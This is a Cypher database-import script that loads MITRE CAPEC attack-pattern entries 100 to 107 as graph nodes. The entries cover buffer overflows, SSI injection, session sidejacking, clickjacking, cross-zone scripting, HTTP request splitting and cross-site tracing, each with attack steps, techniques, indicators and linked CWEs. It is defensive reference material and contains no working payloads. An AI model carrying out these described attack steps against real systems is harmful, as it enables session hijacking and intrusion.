MERGE (:Reference{id: "REF-2", local_id: "R.10.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.10.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-119: Buffer Errors", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/119.html"});
MERGE (:Reference{local_id: "R.10.3", title: "Sharefuzz", link: "http://sharefuzz.sourceforge.net"});
MERGE (:CWE{id: 120});
MERGE (:CWE{id: 302});
MERGE (:CWE{id: 118});
MERGE (:CWE{id: 119});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 99});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 680});
MERGE (:CWE{id: 733});
MERGE (:CWE{id: 697});
CREATE (:AttackPattern{id: 100, name: "Overflow Buffers", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 9, text: "<div level=\"0\">\n  <p class=\"text\">Targeted software performs buffer operations.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 10, text: "<div level=\"0\">\n  <p class=\"text\">Targeted software inadequately performs bounds-checking on buffer operations.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 11, text: "<div level=\"0\">\n  <p class=\"text\">Attacker has the capability to influence the input to buffer operations.</p>\n</div>"});
CREATE (:Submission{id: 75});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 49});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 75, summary: "OrderedDict([('Text', \"Buffer Overflow attacks target improper or missing bounds checking on buffer operations, typically triggered by input injected by an attacker. As a consequence, an attacker is able to write past the boundaries of allocated buffer regions in memory, causing a program crash or potentially redirection of execution as per the attackers' choice.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker identifies a buffer to target. Buffer regions are either allotted on the stack or the heap, and the exact nature of attack would vary depending on the location of the buffer</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Next, the attacker identifies an injection vector to deliver the excessive content to the targeted buffer.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the attacker will craft a set of content that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the attackers' choosing which points to code injected by the attacker.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker injects the content into the targeted software.</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Upon successful exploitation, the system either crashes or control of the program is returned to a location of the attackers' choice. This can result in execution of arbitrary code or escalated privileges, depending upon the exploited target.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2007-2139", description: "<div level=\"0\">\n  <p class=\"text\">Multiple stack-based buffer overflows in the SUN RPC service in CA (formerly Computer Associates) BrightStor ARCserve Media Server, as used in BrightStor ARCserve Backup 9.01 through 11.5 SP2, BrightStor Enterprise Backup 10.5, Server Protection Suite 2, and Business Protection Suite 2, allow remote attackers to execute arbitrary code via malformed RPC strings.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2007-1910", description: "<div level=\"0\">\n  <p class=\"text\">Buffer overflow in wwlib.dll in Microsoft Word 2007 allows remote attackers to cause a denial of service (application crash) and possibly execute arbitrary code via a crafted document</p>\n</div>"});
MERGE (:CWE{id: 120});
MERGE (:CWE{id: 119});
MERGE (:CWE{id: 131});
MERGE (:CWE{id: 129});
MERGE (:CWE{id: 805});
MERGE (:CWE{id: 19});
MERGE (:CWE{id: 680});
CREATE (:ResourcesRequired{id: 4, text: "<div level=\"0\">\n  <p class=\"text\">None: Detecting and exploiting a buffer overflow does not require any resources beyond knowledge of and access to the target system.</p>\n</div>"});
CREATE (:AttackPattern{id: 101, name: "Server Side Include (SSI) Injection", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 12, text: "<div level=\"0\">\n  <p class=\"text\">A web server that supports server side includes and has them enabled</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 13, text: "<div level=\"0\">\n  <p class=\"text\">User controllable input that can carry include directives to the web server</p>\n</div>"});
CREATE (:Submission{id: 76});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 76, summary: "OrderedDict([('Text', 'An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Determine applicability", description: "<div level=\"0\">\n  <p class=\"text\">The attacker determines whether server side includes are enabled on the target web server.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Look for popular page file names. The attacker will look for .shtml, .shtm, .asp, .aspx, and other well-known strings in URLs to help determine whether SSI functionality is enabled.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Fetch .htaccess file. In Apache web server installations, the .htaccess file may enable server side includes in specific locations. In those cases, the .htaccess file lives inside the directory where SSI is enabled, and is theoretically fetchable from the web server. Although most web servers deny fetching the .htaccess file, a misconfigured server will allow it. Thus, an attacker will frequently try it.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">If .htaccess files are used, their contents should be checked for \"Options Includes\" or \"Options IncludesNOEXEC\".</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">If apache is used, the contents of the httpd.conf file and similar configuration files should be checked for \"Options Includes\" or \"Options IncludesNOEXEC\".</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">IIS configurations contain server-side include compatibility.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Web pages that include mundane, but dynamic information (like the current date, a file's size, or some other data that SSI can produce) might be producing that content through SSI.</p>\n</div>"});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Attempt SSI", description: "<div level=\"0\">\n  <p class=\"text\">Look for user controllable input, including HTTP headers, that can carry server side include directives to the web server</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">URL parameters are used.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No parameters appear on the URL. Even though none appear, the web application may still use them if they are provided.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of URLs, with their corresponding parameters is created by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:AttackStep{id: 3, title: "Inject SSI", description: "<div level=\"0\">\n  <p class=\"text\">The attacker may then need to view a particular page in order to have the server execute the include directive and run a command or open a file on behalf of the attacker</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker views data (perhaps from a file) that he normally should not see."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker executes a command on the server, or influences the arguments to a command executed via SSI on the server."});
MERGE (:CWE{id: 97});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 713});
CREATE (:ResourcesRequired{id: 5, text: "<div level=\"0\">\n  <p class=\"text\">None: Determining whether the server supports SSI does not require special tools, and nor does injecting directives that get executed.</p>\n</div>"});
CREATE (:AttackPattern{id: 102, name: "Session Sidejacking", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 14, text: "<div level=\"0\">\n  <p class=\"text\">An attacker and the victim are both using the same WiFi network.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 15, text: "<div level=\"0\">\n  <p class=\"text\">The victim has an active session with a target system.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 16, text: "<div level=\"0\">\n  <p class=\"text\">The victim is not using a secure channel to communicate with the target system (e.g. SSL, VPN, etc.)</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 17, text: "<div level=\"0\">\n  <p class=\"text\">The victim initiated communication with a target system that requires transfer of the session token or the target application uses AJAX and thereby periodically \"rings home\" asynchronously using the session token</p>\n</div>"});
CREATE (:Submission{id: 77});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 50});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 77, summary: "OrderedDict([('Text', ['Session sidejacking takes advantage of an unencrypted communication channel between a victim and target system. The attacker sniffs traffic on a network looking for session tokens in unencrypted traffic. Once a session token is captured, the attacker performs malicious actions by using the stolen token with the targeted application to impersonate the victim.', 'This attack is a specific method of session hijacking, which is exploiting a valid session token to gain unauthorized access to a target system or information. Other methods to perform a session hijacking are session fixation, cross-site scripting, or compromising a user or server machine and stealing the session token.'])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Detect Unprotected Session Token Transfer", description: "<div level=\"0\">\n  <p class=\"text\">The attacker sniffs on the wireless network to detect unencrypted traffic that contains session tokens.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker uses a network sniffer tool like ferret or hamster to monitor the wireless traffic at a WiFi hotspot while examining it for evidence of transmittal of session tokens in unencrypted or recognizably encrypted form. An attacker applies his knowledge of the manner by which session tokens are generated and transmitted by various target systems to identify the session tokens.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The attacker and the victim are both on the same WiFi network.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Traffic between the victim and targeted application is unencrypted.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker sees session tokens in the unencrypted traffic"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Capture session token", description: "<div level=\"0\">\n  <p class=\"text\">The attacker uses sniffing tools to capture a session token from traffic.</p>\n</div>"});
CREATE (:AttackStep{id: 2, title: "Insert captured session token", description: "<div level=\"0\">\n  <p class=\"text\">The attacker attempts to insert a captured session token into communication with the targeted application to confirm viability for exploitation.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Session Token Exploitation", description: "<div level=\"0\">\n  <p class=\"text\">The attacker leverages the captured session token to interact with the targeted application in a malicious fashion, impersonating the victim.</p>\n</div>"});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
MERGE (:CWE{id: 294});
MERGE (:CWE{id: 522});
MERGE (:CWE{id: 523});
MERGE (:CWE{id: 319});
MERGE (:CWE{id: 614});
CREATE (:ResourcesRequired{id: 6, text: "<div level=\"0\">\n  <p class=\"text\">Low: A laptop and access to a public WiFi network.</p>\n</div>"});
CREATE (:AttackPattern{id: 103, name: "Clickjacking", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 18, text: "<div level=\"0\">\n  <p class=\"text\">The victim is communicating with the target application via a web based UI and not a thick client</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 19, text: "<div level=\"0\">\n  <p class=\"text\">The victim's browser security policies allow at least one of the following JavaScript, Flash, iFrames, ActiveX, or CSS.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 20, text: "<div level=\"0\">\n  <p class=\"text\">The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser)</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 21, text: "<div level=\"0\">\n  <p class=\"text\">The victim has an active session with the target system.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 22, text: "<div level=\"0\">\n  <p class=\"text\">The target system's interaction window is open in the victim's browser and supports the ability for initiating sensitive actions on behalf of the user in the target system</p>\n</div>"});
CREATE (:Submission{id: 78});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 78, summary: "OrderedDict([('Text', \"In a clickjacking attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system. While being logged in to some target system, the victim visits the attackers' malicious site which displays a UI that the victim wishes to interact with. In reality, the clickjacked page has a transparent layer above the visible UI with action controls that the attacker wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the attacker may have just tricked the victim into executing some potentially privileged (and most certainly undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks he's clicking on versus what he or she is actually clicking on.\")])"});
CREATE (:AttackPhase{id: 1, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Craft a clickjacking page", description: "<div level=\"0\">\n  <p class=\"text\">The attacker utilizes web page layering techniques to try to craft a malicious clickjacking page</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker leveraged iframe overlay capabilities to craft a malicious clickjacking page</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker leveraged Flash file overlay capabilities to craft a malicious clickjacking page</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">The attacker leveraged Silverlight overlay capabilities to craft a malicious clickjacking page</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">The attacker leveraged cross-frame scripting to craft a malicious clickjacking page</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Overlay capabilities are enabled in the browser</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A page is created that performs unseen actions when the user interacts with the visible UI"});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Attacker lures victim to clickjacking page", description: "<div level=\"0\">\n  <p class=\"text\">Attacker utilizes some form of temptation, misdirection or coercion to lure the victim to loading and interacting with the clickjacking page in a way that increases the chances that the victim will click in the right areas.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Lure the victim to the malicious site by sending the victim an e-mail with a URL to the site.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Lure the victim to the malicious site by manipulating URLs on a site trusted by the victim.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Lure the victim to the malicious site through a cross-site scripting attack.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The victim loads the clickjacking page."});
CREATE (:AttackStep{id: 2, title: "Trick victim into interacting with the clickjacking page in the desired manner", description: "<div level=\"0\">\n  <p class=\"text\">The attacker tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Hide action controls over very commonly used functionality.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Hide action controls over very psychologically tempting content.</p>\n</div>"});
MERGE (:CWE{id: 693});
CREATE (:ResourcesRequired{id: 7, text: "<div level=\"0\">\n  <p class=\"text\">Low: A computer connected to the internet.</p>\n</div>"});
CREATE (:AttackPattern{id: 104, name: "Cross Zone Scripting", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 23, text: "<div level=\"0\">\n  <p class=\"text\">The target must be using a zone-aware browser.</p>\n</div>"});
CREATE (:Submission{id: 79});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 51});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 79, summary: "OrderedDict([('Text', 'An attacker is able to cause a victim to load content into their web-browser that bypasses security zone controls and gain access to increased privileges to execute scripting code or other web objects such as unsigned ActiveX controls or applets. This is a privilege elevation attack targeted at zone-based web-browser security. In a zone-based model, pages belong to one of a set of zones corresponding to the level of privilege assigned to that page. Pages in an untrusted zone would have a lesser level of access to the system and/or be restricted in the types of executable content it was allowed to invoke. In a cross-zone scripting attack, a page that should be assigned to a less privileged zone is granted the privileges of a more trusted zone. This can be accomplished by exploiting bugs in the browser, exploiting incorrect configuration in the zone controls, through a cross-site scripting attack that causes the attackers\\' content to be treated as coming from a more trusted page, or by leveraging some piece of system functionality that is accessible from both the trusted and less trusted zone. This attack differs from \"Restful Privilege Escalation\" in that the latter correlates to the inadequate securing of RESTful access methods (such as HTTP DELETE) on the server, while cross-zone scripting attacks the concept of security zones as implemented by a browser.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Find systems susceptible to the attack", description: "<div level=\"0\">\n  <p class=\"text\">Find systems that contain functionality that is accessed from both the internet zone and the local zone. There needs to be a way to supply input to that functionality from the internet zone and that original input needs to be used later on a page from a local zone.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Leverage knowledge of common local zone functionality on targeted platforms to guide attempted injection of code through relevant internet zone mechanisms. In some cases this may be due to standard system configurations enabling shared functionality between internet and local zones. The attacker can search for indicators that these standard configurations are in place.</p>\n</div>"});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Find the insertion point for the payload", description: "<div level=\"0\">\n  <p class=\"text\">The attacker first needs to find some system functionality or possibly another weakness in the system (e.g. susceptibility to cross site scripting) that would provide the attacker with a mechanism to deliver the payload (i.e. the code to be executed) to the user. The location from which this code is executed in the user's browser needs to be within the local machine zone.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Finding weaknesses in functionality used by both privileged and unprivileged users.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Craft and inject the payload", description: "<div level=\"0\">\n  <p class=\"text\">Develop the payload to be executed in the higher privileged zone in the user's browser. Inject the payload and attempt to lure the victim (if possible) into executing the functionality which unleashes the payload.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker makes it as likely as possible that the vulnerable functionality into which he has injected the payload has a high likelihood of being used by the victim.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Leverage cross-site scripting vulnerability to inject payload.</p>\n</div>"});
MERGE (:CWE{id: 250});
MERGE (:CWE{id: 638});
MERGE (:CWE{id: 285});
MERGE (:CWE{id: 116});
MERGE (:CWE{id: 20});
CREATE (:ResourcesRequired{id: 8, text: "<div level=\"0\">\n  <p class=\"text\">No specialized equipment is needed</p>\n</div>"});
CREATE (:AttackPattern{id: 105, name: "HTTP Request Splitting", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 24, text: "<div level=\"0\">\n  <p class=\"text\">User-manipulateable HTTP Request headers are processed by the web server</p>\n</div>"});
CREATE (:Submission{id: 80});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 80, summary: "OrderedDict([('Text', ['HTTP Request Splitting (also known as HTTP Request Smuggling) is an attack pattern where an attacker attempts to insert additional HTTP requests in the body of the original (enveloping) HTTP request in such a way that the browser interprets it as one request but the web server interprets it as two.', 'There are several ways to perform HTTP request splitting attacks. One way is to include double Content-Length headers in the request to exploit the fact that the devices parsing the request may each use a different header. Another way is to submit an HTTP request with a \"Transfer Encoding: chunked\" in the request header set with setRequestHeader to allow a payload in the HTTP Request that can be considered as another HTTP Request by a subsequent parsing entity. A third way is to use the \"Double CR in an HTTP header\" technique. There are also a few less general techniques targeting specific parsing vulnerabilities in certain web servers.'])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Investigate Target Environment", description: "<div level=\"0\">\n  <p class=\"text\">Determine the technologies used in the target environment such as types of browsers, web servers, application firewalls, proxies, etc.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Investigation of the target environment to determine the types of technologies used to parse the incoming HTTP requests. Attempt to understand how HTTP Request headers are parsed</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Post a malicious HTTP Request", description: "<div level=\"0\">\n  <p class=\"text\">Post a malicious HTTP request that will be interpreted as multiple HTTP requests when parsed on the server</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Post a malicious HTTP Request utilizing double CR/LF characters in HTTP header to cause request splitting</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Post a malicious HTTP Request utilizing \"Transfer Encoding: chunked\" in the request header to cause request splitting</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Post a malicious HTTP Request utilizing double Content-Length headers to cause request splitting</p>\n</div>"});
MERGE (:CWE{id: 436});
MERGE (:CWE{id: 444});
CREATE (:ResourcesRequired{id: 9, text: "<div level=\"0\">\n  <p class=\"text\">Low: No specialized equipment is needed</p>\n</div>"});
CREATE (:AttackPattern{id: 106, name: "DEPRECATED: XSS through Log Files", status: "Deprecated", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:Submission{id: 81});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 52});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 53});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Activation_Zone, Architectural_Paradigms, Attack_Motivation-Consequences, Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, CIA_Impact, Description, Description Summary, Examples-Instances, Frameworks, Injection_Vector, Languages, Methods_of_Attack, Payload, Payload_Activation_Impact, Platforms, Probing_Techniques, Purposes, Related_Attack_Patterns, Related_Security_Principles, Related_Weaknesses, Relevant_Security_Requirements, Resources_Required, Solutions_and_Mitigations, Technical_Context, Typical_Likelihood_of_Exploit, Typical_Severity"});
CREATE (:PreviousEntryName{id: 17, name: "Cross Site Scripting through Log Files"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 81, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated as it referes to an existing chain relationship between \"CAPEC-93 : Log Injection-Tampering-Forging\" and \"CAPEC-63 : Cross-Site Scripting\". Please refer to these CAPECs going forward.')])"});
CREATE (:AttackPattern{id: 107, name: "Cross Site Tracing", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 25, text: "<div level=\"0\">\n  <p class=\"text\">HTTP TRACE is enabled on the web server</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 26, text: "<div level=\"0\">\n  <p class=\"text\">The destination system is susceptible to XSS or an attacker can leverage some other weakness to bypass the same origin policy</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 27, text: "<div level=\"0\">\n  <p class=\"text\">Scripting is enabled in the client's browser</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 28, text: "<div level=\"0\">\n  <p class=\"text\">HTTP is used as the communication protocol between the server and the client</p>\n</div>"});
CREATE (:Submission{id: 82});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 54});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 82, summary: "OrderedDict([('Text', ['Cross Site Tracing (XST) enables an attacker to steal the victim\\'s session cookie and possibly other authentication credentials transmitted in the header of the HTTP request when the victim\\'s browser communicates to destination system\\'s web server. The attacker first gets a malicious script to run in the victim\\'s browser that induces the browser to initiate an HTTP TRACE request to the web server. If the destination web server allows HTTP TRACE requests, it will proceed to return a response to the victim\\'s web browser that contains the original HTTP request in its body. The function of HTTP TRACE, as defined by the HTTP specification, is to echo the request that the web server receives from the client back to the client. Since the HTTP header of the original request had the victim\\'s session cookie in it, that session cookie can now be picked off the HTTP TRACE response and sent to the attackers\\' malicious site. XST becomes relevant when direct access to the session cookie via the \"document.cookie\" object is disabled with the use of httpOnly attribute which ensures that the cookie can be transmitted in HTTP requests but cannot be accessed in other ways. Using SSL does not protect against XST.', \"If the system with which the victim is interacting is susceptible to XSS, an attacker can exploit that weakness directly to get his or her malicious script to issue an HTTP TRACE request to the destination system's web server. In the absence of an XSS weakness on the site with which the victim is interacting, an attacker can get the script to come from the site that he controls and get it to execute in the victim's browser (if he can trick the victim's into visiting his malicious website or clicking on the link that he supplies). However, in that case, due to the same origin policy protection mechanism in the browser, the attackers' malicious script cannot directly issue an HTTP TRACE request to the destination system's web server because the malicious script did not originate at that domain. An attacker will then need to find a way to exploit another weakness that would enable him or her to get around the same origin policy protection.\"])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Determine if HTTP Trace is enabled", description: "<div level=\"0\">\n  <p class=\"text\">Determine if HTTP Trace is enabled at the web server with which the victim has a an active session</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker may issue an HTTP Trace request to the target web server and observe if the response arrives with the original request in the body of the response.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">HTTP Trace is enabled on the web server</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The original request is returned after the HTTP Trace request."});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Identify mechanism to launch HTTP Trace request", description: "<div level=\"0\">\n  <p class=\"text\">The attacker attempts to force the victim to issue an HTTP Trace request to the targeted application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker probes for cross-site scripting vulnerabilities to force the victim into issuing an HTTP Trace request.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker's script is executed within the browser context."});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Create a malicious script that pings the web server with HTTP TRACE request", description: "<div level=\"0\">\n  <p class=\"text\">Create a malicious script that will induce the victim's browser to issue an HTTP TRACE request to the destination system's web server. The script will further intercept the response from the web server, pick up sensitive information out of it, and forward to the site controlled by the attacker.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker's malicious script circumvents the httpOnly cookie attribute that prevents from hijacking the victim's session cookie directly using document.cookie and instead leverages the HTTP TRACE to catch this information from the header of the HTTP request once it is echoed back from the web server in the body of the HTTP TRACE response.</p>\n</div>"});
